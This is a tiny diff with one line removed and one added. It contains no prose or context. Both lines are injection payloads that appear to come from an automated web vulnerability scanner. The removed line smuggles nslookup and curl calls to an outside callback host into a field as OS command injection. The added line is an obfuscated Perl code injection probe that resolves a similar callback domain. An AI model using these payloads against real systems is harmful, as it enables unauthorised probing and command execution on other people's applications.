@@ -1,1 +1,1 @@
-&(nslookup -q=cname hitpwhlvlfrgafe5d3.bxss.me||curl hitpwhlvlfrgafe5d3.bxss.me)&'\"`0&(nslookup -q=cname hitpwhlvlfrgafe5d3.bxss.me||curl hitpwhlvlfrgafe5d3.bxss.me)&`'
+gethostbyname(lc('hitpr'.'ngdezehj53365.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(107).chr(78).chr(119).chr(87)
